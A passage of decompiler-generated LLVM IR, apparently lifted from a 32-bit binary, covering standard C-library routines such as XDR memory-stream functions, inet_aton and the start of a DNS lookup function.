dec_label_pc_10011c84:                            ; preds = %dec_label_pc_10011c5c, %dec_label_pc_10011bfc
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011c88

dec_label_pc_10011c88:                            ; preds = %dec_label_pc_10011c7c, %dec_label_pc_10011c64, %dec_label_pc_10011c84
  %v0_10011c98 = phi i32 [ 0, %dec_label_pc_10011c7c ], [ %v0_10011c98.pre, %dec_label_pc_10011c64 ], [ 1, %dec_label_pc_10011c84 ]
  ret i32 %v0_10011c98

; uselistorder directives
  uselistorder i32 %v0_10011c40, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9 }
  uselistorder i32 (i32*)* @xdr_opaque, { 1, 2, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011c88, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10011c7c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10011c5c, { 1, 0 }
  uselistorder label %dec_label_pc_10011c3c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011bdc, { 1, 0 }
}

define i32 @xdr_netobj(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10011ca4 = add i32 %arg1, 4
  %v4_10011ca8 = inttoptr i32 %v1_10011ca4 to i32*
  %v5_10011ca8 = call i32 @xdr_bytes(i32* %v4_10011ca8, i32 %arg1, i32 1024, i32 1024)
  ret i32 %v5_10011ca8
}

define i32 @__GI_xdrmem_create(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10011cb0 = add i32 %tmp, 20
  %v3_10011cb0 = inttoptr i32 %v2_10011cb0 to i32*
  store i32 %arg3, i32* %v3_10011cb0, align 4
  store i32 %arg4, i32* %arg1, align 4
  %v2_10011cbc = add i32 %tmp, 4
  %v3_10011cbc = inttoptr i32 %v2_10011cbc to i32*
  store i32 ptrtoint (i32* @global_var_100173e8.435 to i32), i32* %v3_10011cbc, align 4
  %v2_10011cc0 = add i32 %tmp, 12
  %v3_10011cc0 = inttoptr i32 %v2_10011cc0 to i32*
  store i32 %arg2, i32* %v3_10011cc0, align 4
  %v2_10011cc4 = add i32 %tmp, 16
  %v3_10011cc4 = inttoptr i32 %v2_10011cc4 to i32*
  store i32 %arg2, i32* %v3_10011cc4, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 3, 0, 2, 1, 4 }
}

define i32 @xdrmem_destroy() local_unnamed_addr {
entry:
  %v0_10011ccc = load i32, i32* @r3, align 4
  ret i32 %v0_10011ccc
}

define i32 @xdrmem_getlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10011cd0 = add i32 %arg1, 20
  %v2_10011cd0 = inttoptr i32 %v1_10011cd0 to i32*
  %v3_10011cd0 = load i32, i32* %v2_10011cd0, align 4
  store i32 %v3_10011cd0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10011cd0, 4
  br i1 %tmp2, label %dec_label_pc_10011d04, label %dec_label_pc_10011ce4

dec_label_pc_10011ce4:                            ; preds = %entry
  %v1_10011cdc = add i32 %v3_10011cd0, -4
  %v1_10011ce4 = add i32 %arg1, 12
  %v2_10011ce4 = inttoptr i32 %v1_10011ce4 to i32*
  %v3_10011ce4 = load i32, i32* %v2_10011ce4, align 4
  store i32 %v3_10011ce4, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_10011cdc, i32* %v2_10011cd0, align 4
  %v0_10011cf0 = load i32, i32* %r9.global-to-local, align 4
  %v1_10011cf0 = inttoptr i32 %v0_10011cf0 to i32*
  %v2_10011cf0 = load i32, i32* %v1_10011cf0, align 4
  store i32 %v2_10011cf0, i32* %arg2, align 4
  %v3_10011cf8 = load i32, i32* %v2_10011ce4, align 4
  %v1_10011cfc = add i32 %v3_10011cf8, 4
  store i32 %v1_10011cfc, i32* %r9.global-to-local, align 4
  store i32 %v1_10011cfc, i32* %v2_10011ce4, align 4
  %v0_10011d04.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011d04

dec_label_pc_10011d04:                            ; preds = %entry, %dec_label_pc_10011ce4
  %v0_10011d04 = phi i32 [ 0, %entry ], [ %v0_10011d04.pre, %dec_label_pc_10011ce4 ]
  ret i32 %v0_10011d04

; uselistorder directives
  uselistorder i32* %v2_10011ce4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011d04, { 1, 0 }
}

define i32 @xdrmem_putlong(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10011d0c = add i32 %arg1, 20
  %v2_10011d0c = inttoptr i32 %v1_10011d0c to i32*
  %v3_10011d0c = load i32, i32* %v2_10011d0c, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10011d0c, 4
  br i1 %tmp2, label %dec_label_pc_10011d40, label %dec_label_pc_10011d20

dec_label_pc_10011d20:                            ; preds = %entry
  %v1_10011d18 = add i32 %v3_10011d0c, -4
  store i32 %v1_10011d18, i32* %v2_10011d0c, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10011d28 = add i32 %arg1, 12
  %v2_10011d28 = inttoptr i32 %v1_10011d28 to i32*
  %v3_10011d28 = load i32, i32* %v2_10011d28, align 4
  %v2_10011d2c = load i32, i32* %arg2, align 4
  %v2_10011d30 = inttoptr i32 %v3_10011d28 to i32*
  store i32 %v2_10011d2c, i32* %v2_10011d30, align 4
  %v3_10011d34 = load i32, i32* %v2_10011d28, align 4
  %v1_10011d38 = add i32 %v3_10011d34, 4
  store i32 %v1_10011d38, i32* %v2_10011d28, align 4
  %v0_10011d40.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011d40

dec_label_pc_10011d40:                            ; preds = %entry, %dec_label_pc_10011d20
  %v0_10011d40 = phi i32 [ 0, %entry ], [ %v0_10011d40.pre, %dec_label_pc_10011d20 ]
  ret i32 %v0_10011d40

; uselistorder directives
  uselistorder i32* %v2_10011d28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011d40, { 1, 0 }
}

define i32 @xdrmem_getpos(i32 %arg1) local_unnamed_addr {
entry:
  %v1_10011d48 = add i32 %arg1, 16
  %v2_10011d48 = inttoptr i32 %v1_10011d48 to i32*
  %v3_10011d48 = load i32, i32* %v2_10011d48, align 4
  %v1_10011d4c = add i32 %arg1, 12
  %v2_10011d4c = inttoptr i32 %v1_10011d4c to i32*
  %v3_10011d4c = load i32, i32* %v2_10011d4c, align 4
  %v2_10011d50 = sub i32 %v3_10011d4c, %v3_10011d48
  ret i32 %v2_10011d50
}

define i32 @xdrmem_setpos(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v1_10011d58 = add i32 %arg1, 20
  %v2_10011d58 = inttoptr i32 %v1_10011d58 to i32*
  %v3_10011d58 = load i32, i32* %v2_10011d58, align 4
  store i32 %v3_10011d58, i32* %r9.global-to-local, align 4
  %v1_10011d5c = add i32 %arg1, 12
  %v2_10011d5c = inttoptr i32 %v1_10011d5c to i32*
  %v3_10011d5c = load i32, i32* %v2_10011d5c, align 4
  %v1_10011d60 = add i32 %arg1, 16
  %v2_10011d60 = inttoptr i32 %v1_10011d60 to i32*
  %v3_10011d60 = load i32, i32* %v2_10011d60, align 4
  %v2_10011d64 = add i32 %v3_10011d5c, %v3_10011d58
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10011d6c = add i32 %v3_10011d60, %arg2
  store i32 %v2_10011d6c, i32* %r4.global-to-local, align 4
  %v3_10011d70 = icmp slt i32 %v2_10011d64, %v2_10011d6c
  br i1 %v3_10011d70, label %dec_label_pc_10011d88, label %dec_label_pc_10011d7c

dec_label_pc_10011d7c:                            ; preds = %entry
  %v2_10011d74 = sub i32 %v2_10011d64, %v2_10011d6c
  store i32 %v2_10011d74, i32* %v2_10011d58, align 4
  store i32 1, i32* %r9.global-to-local, align 4
  %v0_10011d84 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10011d84, i32* %v2_10011d5c, align 4
  %v0_10011d88.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10011d88

dec_label_pc_10011d88:                            ; preds = %entry, %dec_label_pc_10011d7c
  %v0_10011d88 = phi i32 [ 0, %entry ], [ %v0_10011d88.pre, %dec_label_pc_10011d7c ]
  ret i32 %v0_10011d88

; uselistorder directives
  uselistorder i32 %v2_10011d6c, { 1, 0, 2 }
  uselistorder i32 %v2_10011d64, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10011d88, { 1, 0 }
}

define i32 @xdrmem_inline(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %v1_10011d90 = add i32 %arg1, 20
  %v2_10011d90 = inttoptr i32 %v1_10011d90 to i32*
  %v3_10011d90 = load i32, i32* %v2_10011d90, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v2_10011d98 = icmp ult i32 %v3_10011d90, %arg2
  br i1 %v2_10011d98, label %dec_label_pc_10011db4, label %dec_label_pc_10011da4

dec_label_pc_10011da4:                            ; preds = %entry
  %v2_10011d9c = sub i32 %v3_10011d90, %arg2
  %v1_10011da4 = add i32 %arg1, 12
  %v2_10011da4 = inttoptr i32 %v1_10011da4 to i32*
  %v3_10011da4 = load i32, i32* %v2_10011da4, align 4
  store i32 %v3_10011da4, i32* %r9.global-to-local, align 4
  store i32 %v2_10011d9c, i32* %v2_10011d90, align 4
  %v0_10011dac = load i32, i32* %r9.global-to-local, align 4
  %v2_10011dac = add i32 %v0_10011dac, %arg2
  store i32 %v2_10011dac, i32* %v2_10011da4, align 4
  %v0_10011db4.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10011db4

dec_label_pc_10011db4:                            ; preds = %entry, %dec_label_pc_10011da4
  %v0_10011db4 = phi i32 [ 0, %entry ], [ %v0_10011db4.pre, %dec_label_pc_10011da4 ]
  ret i32 %v0_10011db4

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10011db4, { 1, 0 }
}

define i32 @xdrmem_getint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v1_10011dbc = add i32 %arg1, 20
  %v2_10011dbc = inttoptr i32 %v1_10011dbc to i32*
  %v3_10011dbc = load i32, i32* %v2_10011dbc, align 4
  store i32 %v3_10011dbc, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10011dbc, 4
  br i1 %tmp2, label %dec_label_pc_10011df0, label %dec_label_pc_10011dd0

dec_label_pc_10011dd0:                            ; preds = %entry
  %v1_10011dc8 = add i32 %v3_10011dbc, -4
  %v1_10011dd0 = add i32 %arg1, 12
  %v2_10011dd0 = inttoptr i32 %v1_10011dd0 to i32*
  %v3_10011dd0 = load i32, i32* %v2_10011dd0, align 4
  store i32 %v3_10011dd0, i32* %r9.global-to-local, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  store i32 %v1_10011dc8, i32* %v2_10011dbc, align 4
  %v0_10011ddc = load i32, i32* %r9.global-to-local, align 4
  %v1_10011ddc = inttoptr i32 %v0_10011ddc to i32*
  %v2_10011ddc = load i32, i32* %v1_10011ddc, align 4
  store i32 %v2_10011ddc, i32* %arg2, align 4
  %v3_10011de4 = load i32, i32* %v2_10011dd0, align 4
  %v1_10011de8 = add i32 %v3_10011de4, 4
  store i32 %v1_10011de8, i32* %r9.global-to-local, align 4
  store i32 %v1_10011de8, i32* %v2_10011dd0, align 4
  %v0_10011df0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011df0

dec_label_pc_10011df0:                            ; preds = %entry, %dec_label_pc_10011dd0
  %v0_10011df0 = phi i32 [ 0, %entry ], [ %v0_10011df0.pre, %dec_label_pc_10011dd0 ]
  ret i32 %v0_10011df0

; uselistorder directives
  uselistorder i32* %v2_10011dd0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011df0, { 1, 0 }
}

define i32 @xdrmem_putint32(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v1_10011df8 = add i32 %arg1, 20
  %v2_10011df8 = inttoptr i32 %v1_10011df8 to i32*
  %v3_10011df8 = load i32, i32* %v2_10011df8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %tmp2 = icmp ult i32 %v3_10011df8, 4
  br i1 %tmp2, label %dec_label_pc_10011e2c, label %dec_label_pc_10011e0c

dec_label_pc_10011e0c:                            ; preds = %entry
  %v1_10011e04 = add i32 %v3_10011df8, -4
  store i32 %v1_10011e04, i32* %v2_10011df8, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10011e14 = add i32 %arg1, 12
  %v2_10011e14 = inttoptr i32 %v1_10011e14 to i32*
  %v3_10011e14 = load i32, i32* %v2_10011e14, align 4
  %v2_10011e18 = load i32, i32* %arg2, align 4
  %v2_10011e1c = inttoptr i32 %v3_10011e14 to i32*
  store i32 %v2_10011e18, i32* %v2_10011e1c, align 4
  %v3_10011e20 = load i32, i32* %v2_10011e14, align 4
  %v1_10011e24 = add i32 %v3_10011e20, 4
  store i32 %v1_10011e24, i32* %v2_10011e14, align 4
  %v0_10011e2c.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011e2c

dec_label_pc_10011e2c:                            ; preds = %entry, %dec_label_pc_10011e0c
  %v0_10011e2c = phi i32 [ 0, %entry ], [ %v0_10011e2c.pre, %dec_label_pc_10011e0c ]
  ret i32 %v0_10011e2c

; uselistorder directives
  uselistorder i32* %v2_10011e14, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011e2c, { 1, 0 }
}

define i32 @xdrmem_putbytes(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg2, i32* %r30.global-to-local, align 4
  %v1_10011e4c = add i32 %arg1, 20
  %v2_10011e4c = inttoptr i32 %v1_10011e4c to i32*
  %v3_10011e4c = load i32, i32* %v2_10011e4c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_10011e54 = icmp ult i32 %v3_10011e4c, %arg2
  br i1 %v2_10011e54, label %dec_label_pc_10011e7c, label %dec_label_pc_10011e60

dec_label_pc_10011e60:                            ; preds = %entry
  %v2_10011e58 = sub i32 %v3_10011e4c, %arg2
  store i32 %v2_10011e58, i32* %v2_10011e4c, align 4
  %v0_10011e64 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011e64 = add i32 %v0_10011e64, 12
  %v2_10011e64 = inttoptr i32 %v1_10011e64 to i32*
  %v3_10011e64 = load i32, i32* %v2_10011e64, align 4
  store i32 %v3_10011e64, i32* @r3, align 4
  store i32 268508780, i32* @lr, align 4
  %v0_10011e68 = call i32 @memcpy()
  store i32 %v0_10011e68, i32* %r3.global-to-local, align 4
  %v0_10011e6c = load i32, i32* %r31.global-to-local, align 4
  %v1_10011e6c = add i32 %v0_10011e6c, 12
  %v2_10011e6c = inttoptr i32 %v1_10011e6c to i32*
  %v3_10011e6c = load i32, i32* %v2_10011e6c, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_10011e74 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011e74 = add i32 %v1_10011e74, %v3_10011e6c
  store i32 %v2_10011e74, i32* %v2_10011e6c, align 4
  %v0_10011e8c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011e7c

dec_label_pc_10011e7c:                            ; preds = %entry, %dec_label_pc_10011e60
  %v0_10011e8c = phi i32 [ 0, %entry ], [ %v0_10011e8c.pre, %dec_label_pc_10011e60 ]
  ret i32 %v0_10011e8c

; uselistorder directives
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011e7c, { 1, 0 }
}

define i32 @xdrmem_getbytes(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  store i32 %arg3, i32* %r30.global-to-local, align 4
  %v1_10011eac = add i32 %arg1, 20
  %v2_10011eac = inttoptr i32 %v1_10011eac to i32*
  %v3_10011eac = load i32, i32* %v2_10011eac, align 4
  store i32 %arg2, i32* @r3, align 4
  %v2_10011eb4 = icmp ult i32 %v3_10011eac, %arg3
  br i1 %v2_10011eb4, label %dec_label_pc_10011edc, label %dec_label_pc_10011ec0

dec_label_pc_10011ec0:                            ; preds = %entry
  %v2_10011eb8 = sub i32 %v3_10011eac, %arg3
  store i32 %v2_10011eb8, i32* %v2_10011eac, align 4
  %v0_10011ec4 = load i32, i32* %r31.global-to-local, align 4
  %v1_10011ec4 = add i32 %v0_10011ec4, 12
  %v2_10011ec4 = inttoptr i32 %v1_10011ec4 to i32*
  %v3_10011ec4 = load i32, i32* %v2_10011ec4, align 4
  store i32 %v3_10011ec4, i32* @r4, align 4
  store i32 268508876, i32* @lr, align 4
  %v0_10011ec8 = call i32 @memcpy()
  %v0_10011ecc = load i32, i32* %r31.global-to-local, align 4
  %v1_10011ecc = add i32 %v0_10011ecc, 12
  %v2_10011ecc = inttoptr i32 %v1_10011ecc to i32*
  %v3_10011ecc = load i32, i32* %v2_10011ecc, align 4
  store i32 1, i32* %r11.global-to-local, align 4
  %v1_10011ed4 = load i32, i32* %r30.global-to-local, align 4
  %v2_10011ed4 = add i32 %v1_10011ed4, %v3_10011ecc
  store i32 %v2_10011ed4, i32* %v2_10011ecc, align 4
  %v0_10011ee0.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10011edc

dec_label_pc_10011edc:                            ; preds = %entry, %dec_label_pc_10011ec0
  %v0_10011ee0 = phi i32 [ 0, %entry ], [ %v0_10011ee0.pre, %dec_label_pc_10011ec0 ]
  ret i32 %v0_10011ee0

; uselistorder directives
  uselistorder i32 %arg3, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10011edc, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_10011ef4 = icmp eq i8* %arg1, null
  br i1 %v3_10011ef4, label %dec_label_pc_10011fac, label %dec_label_pc_10011efc

dec_label_pc_10011efc:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_10011f10.pre = load i32, i32* @global_var_1002c2d0, align 4
  br label %dec_label_pc_10011f0c

dec_label_pc_10011f0c:                            ; preds = %dec_label_pc_10011efc, %dec_label_pc_10011f84
  %v0_10011f84 = phi i32 [ 0, %dec_label_pc_10011efc ], [ %v2_10011f8c, %dec_label_pc_10011f84 ]
  %v0_10011f88 = phi i32 [ 1, %dec_label_pc_10011efc ], [ %v1_10011f88, %dec_label_pc_10011f84 ]
  %v0_10011f0c = phi i32 [ %tmp, %dec_label_pc_10011efc ], [ %v0_10011f0c3, %dec_label_pc_10011f84 ]
  %v1_10011f0c = inttoptr i32 %v0_10011f0c to i8*
  %v2_10011f0c = load i8, i8* %v1_10011f0c, align 1
  %v3_10011f0c = zext i8 %v2_10011f0c to i32
  store i32 %v3_10011f10.pre, i32* @r7, align 4
  %v1_10011f14 = mul nuw nsw i32 %v3_10011f0c, 2
  %v2_10011f18 = add i32 %v1_10011f14, %v3_10011f10.pre
  %v3_10011f18 = inttoptr i32 %v2_10011f18 to i16*
  %v4_10011f18 = load i16, i16* %v3_10011f18, align 2
  %v1_10011f1c = and i16 %v4_10011f18, 8
  %v3_10011f1c = icmp eq i16 %v1_10011f1c, 0
  br i1 %v3_10011f1c, label %dec_label_pc_10011fac, label %dec_label_pc_10011f24

dec_label_pc_10011f24:                            ; preds = %dec_label_pc_10011f0c
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10011f3c

dec_label_pc_10011f2c:                            ; preds = %dec_label_pc_10011f3c
  %v1_10011f2c = add i32 %v2_10011f48, -48
  store i32 %v1_10011f2c, i32* @r8, align 4
  %v1_10011f30 = add i32 %v0_10011f74, 1
  %v2_10011f34 = icmp sgt i32 %v1_10011f2c, 255
  br i1 %v2_10011f34, label %dec_label_pc_10011fac, label %dec_label_pc_10011f3c

dec_label_pc_10011f3c:                            ; preds = %dec_label_pc_10011f2c, %dec_label_pc_10011f24
  %v1_10011f8c = phi i32 [ %v1_10011f2c, %dec_label_pc_10011f2c ], [ 0, %dec_label_pc_10011f24 ]
  %v0_10011f74 = phi i32 [ %v1_10011f30, %dec_label_pc_10011f2c ], [ %v0_10011f0c, %dec_label_pc_10011f24 ]
  %v1_10011f3c = inttoptr i32 %v0_10011f74 to i8*
  %v2_10011f3c = load i8, i8* %v1_10011f3c, align 1
  %v3_10011f3c = zext i8 %v2_10011f3c to i32
  %v1_10011f40 = mul i32 %v1_10011f8c, 10
  %v1_10011f44 = mul nuw nsw i32 %v3_10011f3c, 2
  %v2_10011f48 = add i32 %v3_10011f3c, %v1_10011f40
  store i32 %v2_10011f48, i32* @r10, align 4
  %v2_10011f4c = add i32 %v1_10011f44, %v3_10011f10.pre
  %v3_10011f4c = inttoptr i32 %v2_10011f4c to i16*
  %v4_10011f4c = load i16, i16* %v3_10011f4c, align 2
  %v5_10011f4c = zext i16 %v4_10011f4c to i32
  %v1_10011f50 = and i32 %v5_10011f4c, 8
  %v3_10011f50 = icmp eq i32 %v1_10011f50, 0
  br i1 %v3_10011f50, label %dec_label_pc_10011f58, label %dec_label_pc_10011f2c

dec_label_pc_10011f58:                            ; preds = %dec_label_pc_10011f3c
  %v2_10011f58 = icmp sgt i32 %v0_10011f88, 3
  br i1 %v2_10011f58, label %dec_label_pc_10011f70, label %dec_label_pc_10011f60

dec_label_pc_10011f60:                            ; preds = %dec_label_pc_10011f58
  %v3_10011f60 = icmp eq i8 %v2_10011f3c, 46
  br i1 %v3_10011f60, label %dec_label_pc_10011f68, label %dec_label_pc_10011fac

dec_label_pc_10011f68:                            ; preds = %dec_label_pc_10011f60
  %v1_10011f68 = add i32 %v0_10011f74, 1
  br label %dec_label_pc_10011f84

dec_label_pc_10011f70:                            ; preds = %dec_label_pc_10011f58
  %v3_10011f70 = icmp eq i8 %v2_10011f3c, 0
  %v1_10011f74 = add i32 %v0_10011f74, 1
  br i1 %v3_10011f70, label %dec_label_pc_10011f84, label %dec_label_pc_10011f7c

dec_label_pc_10011f7c:                            ; preds = %dec_label_pc_10011f70
  %v1_10011f7c = and i32 %v5_10011f4c, 32
  %v3_10011f7c = icmp eq i32 %v1_10011f7c, 0
  br i1 %v3_10011f7c, label %dec_label_pc_10011fac, label %dec_label_pc_10011f84

dec_label_pc_10011f84:                            ; preds = %dec_label_pc_10011f7c, %dec_label_pc_10011f70, %dec_label_pc_10011f68
  %v0_10011f0c3 = phi i32 [ %v1_10011f74, %dec_label_pc_10011f7c ], [ %v1_10011f74, %dec_label_pc_10011f70 ], [ %v1_10011f68, %dec_label_pc_10011f68 ]
  %v1_10011f84 = mul i32 %v0_10011f84, 256
  %v1_10011f88 = add nuw nsw i32 %v0_10011f88, 1
  %v2_10011f8c = or i32 %v1_10011f8c, %v1_10011f84
  store i32 %v2_10011f8c, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_10011f88, 5
  br i1 %tmp10, label %dec_label_pc_10011f0c, label %dec_label_pc_10011f98

dec_label_pc_10011f98:                            ; preds = %dec_label_pc_10011f84
  %v0_10011f98 = load i32, i32* @r4, align 4
  %v3_10011f98 = icmp eq i32 %v0_10011f98, 0
  %v0_10011fa0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10011f98, i32 %v0_10011fa0)
  %v0_10011fa4 = load i32, i32* %r5.global-to-local, align 4
  %v1_10011fa4 = load i32, i32* @r4, align 4
  %v2_10011fa4 = inttoptr i32 %v1_10011fa4 to i32*
  store i32 %v0_10011fa4, i32* %v2_10011fa4, align 4
  ret i32 1

dec_label_pc_10011fac:                            ; preds = %dec_label_pc_10011f60, %dec_label_pc_10011f7c, %dec_label_pc_10011f0c, %dec_label_pc_10011f2c, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_10011f8c, { 1, 0 }
  uselistorder i32 %v1_10011f88, { 1, 0 }
  uselistorder i32 %v2_10011f48, { 1, 0 }
  uselistorder i32 %v3_10011f3c, { 1, 0 }
  uselistorder i32 %v0_10011f74, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10011fac, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_10011f0c, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  store i32 %arg5, i32* @r7, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10011fb8 = load i32, i32* @lr, align 4
  store i32 %v0_10011fb8, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* @r16, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268509156, i32* @lr, align 4
  %v0_10011fe0 = call i32 @malloc()
  store i32 %v0_10011fe0, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268509168, i32* @lr, align 4
  %v0_10011fec = call i32 @malloc()
  %v0_10011ff0 = load i32, i32* @r30, align 4
  %v3_10011ff0 = icmp eq i32 %v0_10011ff0, 0
  store i32 %v0_10011fec, i32* @r21, align 4
  br i1 %v3_10011ff0, label %dec_label_pc_100125ac, label %dec_label_pc_10011ffc

dec_label_pc_10011ffc:                            ; preds = %entry
  %v3_10011ffc = icmp eq i32 %v0_10011fec, 0
  br i1 %v3_10011ffc, label %dec_label_pc_100125ac, label %dec_label_pc_10012004

dec_label_pc_10012004:                            ; preds = %dec_label_pc_10011ffc
  %v0_10012004 = load i32, i32* @r23, align 4
  %v3_10012004 = icmp eq i32 %v0_10012004, 0
  br i1 %v3_10012004, label %dec_label_pc_100125ac, label %dec_label_pc_1001200c

dec_label_pc_1001200c:                            ; preds = %dec_label_pc_10012004
  %v0_1001200c = load i32, i32* %r14.global-to-local, align 4
  %v1_1001200c = inttoptr i32 %v0_1001200c to i8*
  %v2_1001200c = load i8, i8* %v1_1001200c, align 1
  %v3_1001200c = zext i8 %v2_1001200c to i32
  store i32 %v3_1001200c, i32* %r0.global-to-local, align 4
  %v3_10012010 = icmp eq i8 %v2_1001200c, 0
  br i1 %v3_10012010, label %dec_label_pc_100125ac, label %dec_label_pc_10012018

dec_label_pc_10012018:                            ; preds = %dec_label_pc_1001200c
  store i32 %v0_1001200c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r29.global-to-local, align 4
  %v0_10012020 = call i32 @__GI_strlen()
  %v0_10012028 = load i32, i32* %r14.global-to-local, align 4
  %v2_10012028 = add i32 %v0_10012028, %v0_10012020
  %v1_10012030 = add i32 %v2_10012028, -1
  %v2_10012030 = inttoptr i32 %v1_10012030 to i8*
  %v3_10012030 = load i8, i8* %v2_10012030, align 1
  %v4_10012030 = zext i8 %v3_10012030 to i32
  store i32 %v4_10012030, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030c60.437 to i32), i32* @r29, align 4
  %v2_10012038 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10012038, i32* %r28.global-to-local, align 4
